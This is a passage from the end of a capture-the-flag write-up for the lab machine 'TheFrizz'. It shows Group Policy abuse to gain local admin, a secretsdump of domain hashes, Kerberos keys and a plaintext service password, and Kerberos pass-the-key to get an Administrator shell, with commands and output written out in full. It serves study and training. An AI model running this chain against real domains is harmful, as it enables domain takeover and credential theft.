[+] Creating file \\frizz.htb\SysVol\frizz.htb\Policies\{9D93FC25-FCF2-4A3B-B54D-B67944A7DBA7}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf
[+] versionNumber attribute changed successfully
[+] The version number in GPT.ini was increased successfully.
[+] The GPO was modified to include a new local admin. Wait for the GPO refresh cycle.
[+] Done!
PS C:\Users\M.SchoolBus> Get-GPO -All | Select-Object DisplayName, GpoStatus, Id | Format-Table                                                                                                                                             

DisplayName                       GpoStatus          Id
-----------                       ---------          --                                                                                                                 
Default Domain Policy             AllSettingsEnabled 31b2f340-016d-11d2-945f-00c04fb984f9
Default Domain Controllers Policy AllSettingsEnabled 6ac1786c-016f-11d2-945f-00c04fb984f9
opensesame                        AllSettingsEnabled 9d93fc25-fcf2-4a3b-b54d-b67944a7dba7

PS C:\Users\M.SchoolBus> gpupdate /force                                                                                            
Updating policy...

Computer Policy update has completed successfully.
User Policy update has completed successfully.

PS C:\Users\M.SchoolBus> net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
M.SchoolBus
The command completed successfully
```
We recreate our GPO (called `opensesame` this time) and successfully link it to the OU. Then we use [SharpGPOAbuse.exe](https://github.com/byronkg/SharpGPOAbuse/releases/tag/1.0) to move `m.schoolbus` into the Local Administrators group, and as you can see after use `gpupdate` to force the changes, our user has successfully elevated to a local admin.

##### Profit
```zsh
┌──(kali㉿kali)-[~/…/HTB/thefrizz/exploit/postcomp]
└─$ impacket-secretsdump -k frizz.htb/m.schoolbus@frizzdc.frizz.htb 
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

Password:
[-] CCache file is not found. Skipping...
[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x02a7ae01010ecbfb70406e489a435ec7
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c299f8b2acc2da429d3a35953b3854d7:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
frizz\FRIZZDC$:aes256-cts-hmac-sha1-96:af635128a3d6254dee161354b88ac950beb498588f04346499b3ad089d6eae1d
frizz\FRIZZDC$:aes128-cts-hmac-sha1-96:bfcf9d18b3f2bab4b7981d18594f86b5
frizz\FRIZZDC$:des-cbc-md5:514613086497f8ce
frizz\FRIZZDC$:plain_password_hex:1a1b634b82d79361fc20ad912e91e1023c987107e52e142eed75bc92e168a226668a000933be0489cc116c051a79b994f09aa47ec2aebcd075c08ca042a6dd41765407a9c2bc95266393e57b1281661a4743a61444e35183b2349be9ebcc6e1b6afab94f1e8c6ed42ed4226a290a832d69cc11cfa33e2ecf39c6ffa994bf75a4bfffbc2d1d90c9edec065038352cf1d3779ac20c6000d3ef3e23a6169bfa982c405f6f1826fbeb97d97d80b6340b445b87f122e00148e59cdc772c07b5ff0e0470b55e20fcb51c00c385352c91f2e3eb696c8329f4d34975edfeeb25e89f2869d59fa253c6ed34675489178a72804964
frizz\FRIZZDC$:aad3b435b51404eeaad3b435b51404ee:6ca0969157c45757949674c9b54633c0:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x6c569e111284308ee3eab025d91feccdbf2c05ad
dpapi_userkey:0x29cc651b270566d1903855dba8f2b9a80364e55c
[*] NL$KM 
 0000   1F 7C 2F D4 B2 DB 4E A7  CD 37 51 53 E5 2B C6 BE   .|/...N..7QS.+..
 0010   7F F6 11 AB D2 4F 96 88  34 06 4E E2 CC 76 6E B7   .....O..4.N..vn.
 0020   8C 38 97 B0 D7 53 A3 5A  61 38 80 A3 AF 87 F3 C3   .8...S.Za8......
 0030   41 D6 93 F8 D5 48 86 D1  D7 8D 33 23 EF 63 FF 13   A....H....3#.c..
NL$KM:1f7c2fd4b2db4ea7cd375153e52bc6be7ff611abd24f968834064ee2cc766eb78c3897b0d753a35a613880a3af87f3c341d693f8d54886d1d78d3323ef63ff13
[*] _SC_Apache2.4 
w.webservice@frizz.htb:BananaB0at!!@
[*] _SC_mysql 
w.webservice@frizz.htb:BananaB0at!!@
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
[-] CCache file is not found. Skipping...
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c457b5f1c315bef53b9cabc92e993d0b:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:f2555a6cd2c4f0a1d8c08b78c9b3f15e:::
f.frizzle\f.frizzle:1103:aad3b435b51404eeaad3b435b51404ee:96198b704e6586b657fd425c7baaf105:::
w.li\w.li:1104:aad3b435b51404eeaad3b435b51404ee:1c113211987ca6a9184503b179d9dfaa:::
h.arm\h.arm:1105:aad3b435b51404eeaad3b435b51404ee:8b3055495e80f8ee7d997f7d7a55b4c0:::
M.SchoolBus\M.SchoolBus:1106:aad3b435b51404eeaad3b435b51404ee:c5127655f826fd8fbf09b90ae0795906:::
d.hudson\d.hudson:1107:aad3b435b51404eeaad3b435b51404ee:91cf151e936fc93c86698657b4295460:::
k.franklin\k.franklin:1108:aad3b435b51404eeaad3b435b51404ee:ccfe55e7aa51899f936930f0c200b6c7:::
l.awesome\l.awesome:1109:aad3b435b51404eeaad3b435b51404ee:0d27457ae284988aa5ec067341e22ff3:::
t.wright\t.wright:1110:aad3b435b51404eeaad3b435b51404ee:e952ad2c22fc30cf9ddaa1b9794f833d:::
r.tennelli\r.tennelli:1111:aad3b435b51404eeaad3b435b51404ee:1e47cb7e5d7ac4ec0dc32200f2948ca4:::
J.perlstein\J.perlstein:1112:aad3b435b51404eeaad3b435b51404ee:445f11ff2a95e05a1d5122a6d798de7d:::
a.perlstein\a.perlstein:1113:aad3b435b51404eeaad3b435b51404ee:b61979d08c7b2d5b641f3be3645f3ec8:::
p.terese\p.terese:1114:aad3b435b51404eeaad3b435b51404ee:2803a7b3088798bc8457e8e327eae454:::
v.frizzle\v.frizzle:1115:aad3b435b51404eeaad3b435b51404ee:98efe5a306ed7ce343a4820027e2f3f7:::
g.frizzle\g.frizzle:1116:aad3b435b51404eeaad3b435b51404ee:ad45f1a39d0aad8b715ed02cfd61d564:::
c.sandiego\c.sandiego:1117:aad3b435b51404eeaad3b435b51404ee:1ba512662862a494c993888ff8a5581d:::
c.ramon\c.ramon:1118:aad3b435b51404eeaad3b435b51404ee:a206853184aca2d030a57011786c7f37:::
m.ramon\m.ramon:1119:aad3b435b51404eeaad3b435b51404ee:7576c7d46f8a0512a1eeba70bb424a41:::
w.Webservice\w.Webservice:1120:aad3b435b51404eeaad3b435b51404ee:4382bdea116a67dfac27f11028733ba1:::
FRIZZDC$:1000:aad3b435b51404eeaad3b435b51404ee:6ca0969157c45757949674c9b54633c0:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:ccacae8e6d2659abd32d29c125b93cf8d434c2ceb5a144e4c01807cb6f6eaf89
Administrator:aes128-cts-hmac-sha1-96:e3b797c9257b571573fd413000881faf
Administrator:des-cbc-md5:3e1594979e2980a7
krbtgt:aes256-cts-hmac-sha1-96:e376bea6148c711589ea38462620b6b743609ab8a1b85fc18f5c2de0bb5e63ac
krbtgt:aes128-cts-hmac-sha1-96:7d93ba7b5ef510ac0781d3f8119a4a36
krbtgt:des-cbc-md5:8ae3022f2c704957
f.frizzle\f.frizzle:aes256-cts-hmac-sha1-96:484c1043eb0706147d00977257bb48655f242c147d9be1ff84715521898542cc
f.frizzle\f.frizzle:aes128-cts-hmac-sha1-96:06805a7d339d3c8acb6307a04faee653
f.frizzle\f.frizzle:des-cbc-md5:c4320267f1adb6e5
w.li\w.li:aes256-cts-hmac-sha1-96:6effbb1eba09ab851117868535e4dff61c14c655e90f70aa1ab0d6922aee2ce0
w.li\w.li:aes128-cts-hmac-sha1-96:bcf209612213effe56230ac4d50b8f6a
w.li\w.li:des-cbc-md5:ba3db66d54677c49
h.arm\h.arm:aes256-cts-hmac-sha1-96:ab9b99ab7b8ded15deb83a4bbe893ad2ee041a303e4099d9c23344ec1a9e4ace
h.arm\h.arm:aes128-cts-hmac-sha1-96:9be79d3d4fb3bf1d1f80d40f988b036d
h.arm\h.arm:des-cbc-md5:082f8c9e68133e4c
M.SchoolBus\M.SchoolBus:aes256-cts-hmac-sha1-96:8292fc076a50f4ba9423c5498e21cc8fc58e08dd8893d1a4cb3cb21a008ec90c
M.SchoolBus\M.SchoolBus:aes128-cts-hmac-sha1-96:9de84b490cdea0c6e8b0ec72507c2fad
M.SchoolBus\M.SchoolBus:des-cbc-md5:1a32fbfdd3bfd698
d.hudson\d.hudson:aes256-cts-hmac-sha1-96:a2139fc11bf13aad8aad995dd1e2cee9652d569fc9eaae1d4454d702d9c0b755
d.hudson\d.hudson:aes128-cts-hmac-sha1-96:f12db706a59f64d59fd29d40fd64eaca
d.hudson\d.hudson:des-cbc-md5:015d91195b2fb01f
k.franklin\k.franklin:aes256-cts-hmac-sha1-96:43c0d7534a8fdc93946f78c4e00be6a1c0ff99b6336257d56e7da2f1042d8633
k.franklin\k.franklin:aes128-cts-hmac-sha1-96:d8e066d236147a59da4461b5164a9861
k.franklin\k.franklin:des-cbc-md5:c4b9d5b91aa74a1c
l.awesome\l.awesome:aes256-cts-hmac-sha1-96:d03c82389ee08ed13bd6d8c8fda08ac9b38474f65030ed99c27ae78c538ef336
l.awesome\l.awesome:aes128-cts-hmac-sha1-96:2d6ae81c740dc75fd61ca909e76e293a
l.awesome\l.awesome:des-cbc-md5:b38a02bf916e3d6e
t.wright\t.wright:aes256-cts-hmac-sha1-96:5723d5d587ff1acf8b38477417926191b4ad5eaec3dcb63a4987cc1eea5bc490
t.wright\t.wright:aes128-cts-hmac-sha1-96:1b2835e50c81aac47a7dc59bc4fe441e
t.wright\t.wright:des-cbc-md5:0454e6a4914fcefb
r.tennelli\r.tennelli:aes256-cts-hmac-sha1-96:16850f063c68468ba06e132a4685e23ea3ee3f23c68265c973b7ffac51b29bb0
r.tennelli\r.tennelli:aes128-cts-hmac-sha1-96:f232b4642a196129aa758359df903032
r.tennelli\r.tennelli:des-cbc-md5:adf483a85d674515
J.perlstein\J.perlstein:aes256-cts-hmac-sha1-96:c24d4d07128052803cff76ccbf0260fd0bc61cf753b60242d73a3a9c1a25ebd2
J.perlstein\J.perlstein:aes128-cts-hmac-sha1-96:acabdb0c9874593dec5e7ae83bf5e44e
J.perlstein\J.perlstein:des-cbc-md5:86ce0d7910fedae9
a.perlstein\a.perlstein:aes256-cts-hmac-sha1-96:7a61f4528744e3f1f14519a4e621579923fe9169f98c710e0b771680f0696f61
a.perlstein\a.perlstein:aes128-cts-hmac-sha1-96:255d8818a9242df372c2a57d3317b005
a.perlstein\a.perlstein:des-cbc-md5:bc98a4bab6e3e058
p.terese\p.terese:aes256-cts-hmac-sha1-96:47251a14179a378f6cfbf96aef312f5fd9b254c07e7cbe82c9fe30a76bcf59de
p.terese\p.terese:aes128-cts-hmac-sha1-96:301ebe0e51bfc690324b5449481b081c
p.terese\p.terese:des-cbc-md5:f83b382ad9d9bf1f
v.frizzle\v.frizzle:aes256-cts-hmac-sha1-96:49433c3681a2cba03b407ce6cf549afcb36abe359060fd99eb96f88ec9246239
v.frizzle\v.frizzle:aes128-cts-hmac-sha1-96:13b559d4c8b4e414bda7cc46c06fb796
v.frizzle\v.frizzle:des-cbc-md5:5dd3df0192c1833e
g.frizzle\g.frizzle:aes256-cts-hmac-sha1-96:47210db70acbbe012c08f374879659c59c6de3888125b51c8768c107feeb95e7
g.frizzle\g.frizzle:aes128-cts-hmac-sha1-96:6791f01b18196371cc5c2e133a0f2dd3
g.frizzle\g.frizzle:des-cbc-md5:f1c2cd10077629a2
c.sandiego\c.sandiego:aes256-cts-hmac-sha1-96:a6123424452d95dc795b7363682cd8837d14e67989878b50ffc1480025e5f98e
c.sandiego\c.sandiego:aes128-cts-hmac-sha1-96:ff4d4720872bfeaf9df3e794ad45afb3
c.sandiego\c.sandiego:des-cbc-md5:0bb092c754463704
c.ramon\c.ramon:aes256-cts-hmac-sha1-96:eef53cafbcb8f6306f78842c2d56ee389103cc61162dcc6109f68271956285ac
c.ramon\c.ramon:aes128-cts-hmac-sha1-96:7737c0c3f76f643252c8707546a78bca
c.ramon\c.ramon:des-cbc-md5:4c467c38d03d2a79
m.ramon\m.ramon:aes256-cts-hmac-sha1-96:93143697c1b49451020ad88bca8582476e2bc0a6e572fabb3d8025d44fac9e97
m.ramon\m.ramon:aes128-cts-hmac-sha1-96:57d0aaa39fbcfa0579c9882ba5b7e49c
m.ramon\m.ramon:des-cbc-md5:9b9b0b83d064a467
w.Webservice\w.Webservice:aes256-cts-hmac-sha1-96:8de0f8662f0c72254ef922df0561290435e0eb085b2b082cbb96e2310af25ec6
w.Webservice\w.Webservice:aes128-cts-hmac-sha1-96:fc4b349d4defda07ddf279ac621fc5a1
w.Webservice\w.Webservice:des-cbc-md5:76c892c4103b7f16
FRIZZDC$:aes256-cts-hmac-sha1-96:af635128a3d6254dee161354b88ac950beb498588f04346499b3ad089d6eae1d
FRIZZDC$:aes128-cts-hmac-sha1-96:bfcf9d18b3f2bab4b7981d18594f86b5
FRIZZDC$:des-cbc-md5:58165bf185e59175
```
Using secretsdump we successfully dump the hashes for `Administrator` as well as the ntlm hashes for the domain users.

##### Gaining a shell as Administrator
```zsh
┌──(kali㉿kali)-[~/…/HTB/thefrizz/exploit/postcomp]
└─$ ktutil                                           
ktutil:  addent -key -p administrator@FRIZZ.HTB -k 1 -e aes256-cts-hmac-sha1-96
Key for administrator@FRIZZ.HTB (hex): ccacae8e6d2659abd32d29c125b93cf8d434c2ceb5a144e4c01807cb6f6eaf89
ktutil:  wkt /tmp/a.keytab
ktutil:  q

```
We use `ktutil` to generate a keytab that holds the Administrator's AES-256 hash that we dumped via secretsdump.

```zsh
┌──(kali㉿kali)-[~/…/HTB/thefrizz/exploit/postcomp]
└─$ kinit -k -t /tmp/a.keytab administrator@FRIZZ.HTB
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/…/HTB/thefrizz/exploit/postcomp]
└─$ klist                                            
Ticket cache: FILE:/tmp/krb5cc_1000
Default principal: administrator@FRIZZ.HTB

Valid starting       Expires              Service principal
10/28/2026 00:34:36  10/28/2026 10:34:36  krbtgt/FRIZZ.HTB@FRIZZ.HTB
	renew until 10/29/2026 00:34:36

```
Then we use `kinit` to pull a valid ccache credential for `Administrator` and load it in to our krb5 credential file on kali.

```zsh
┌──(kali㉿kali)-[~/…/HTB/thefrizz/exploit/postcomp]
└─$ export KRB5CCNAME=/tmp/krb5cc_1000                                    
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/…/HTB/thefrizz/exploit/postcomp]
└─$ impacket-wmiexec -k -no-pass frizz.htb/administrator@frizzdc.frizz.htb
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
frizz\administrator

C:\>cd Users
C:\Users>cd Administrator
C:\Users\Administrator>cd Desktop
C:\Users\Administrator\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is D129-C3DA

 Directory of C:\Users\Administrator\Desktop

03/11/2025  04:14 PM    <DIR>          .
03/11/2025  03:37 PM    <DIR>          ..
02/25/2025  03:06 PM             2,083 cleanup.ps1
10/27/2026  07:12 PM                34 root.txt
               2 File(s)          2,117 bytes
               2 Dir(s)   1,932,197,888 bytes free


```
We then use `impacket-wmiexec` with the kerberos and no password flags set for our user and we successfully get a shell as `Administrator` and find `root.txt` on their desktop. pwned...but at what cost...

## Final Thoughts
>[!Takeaways]
>- F using `threader3000` run an all ports NMap from now on. Threader can sometimes miss services that may be important.
>- Whenever NTLM is disabled you need to setup Kerberos or other forms of authentication to the target. In those cases grabbing a ccache with `faketime` and `impacket-getTGT` won't work unless your ccache updates to the server time dynamically. It's better to permanently set your clock to the target via `ntpdate` and then use `kinit` to pull down a proper credential that is pre-matched with the server time.
>- Whenever you come across a local port consider `chisel` to make the tunnel. It's super easy if you have download permissions on your target.
>- Whenever you find a hash and a salt together it's bettter to use the raw format and let hashcat run with it. John's formatting requirements don't always work well with those kinds of hashes.
>- ALWAYS check the Recycle Bin on targets. You never know what's lurking in there.
>- Look at `.ini` files inside the directories you're enumerating as they may contain secrets.
>- Whenever you see `WriteGPLink` permissions over an OU or other object and you can either edit or create a GPO. This is a pathway for GPO abuse.
>- Whenever you are doing GPO abuse, if adding yourself to a local admin will get it done then do that. it doesn't always have to be a reverse shell or a highly technical AD shift. Sometimes local admin is enough.
>- May this kind of machine never find me during my exam...

